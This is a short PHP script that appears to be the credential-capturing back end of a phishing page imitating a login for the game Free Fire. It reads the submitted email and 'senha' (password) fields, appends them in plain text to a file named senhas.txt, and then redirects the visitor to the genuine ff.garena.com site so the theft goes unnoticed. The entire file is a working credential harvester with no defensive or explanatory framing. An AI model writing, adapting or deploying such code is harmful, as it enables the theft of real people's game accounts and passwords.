<?php
$email = $_POST['email'];
$senha = $_POST['senha'];
file_put_contents("senhas.txt", "Email: $email | Senha: $senha\n", FILE_APPEND);
header("Location: https://ff.garena.com");
exit();
?>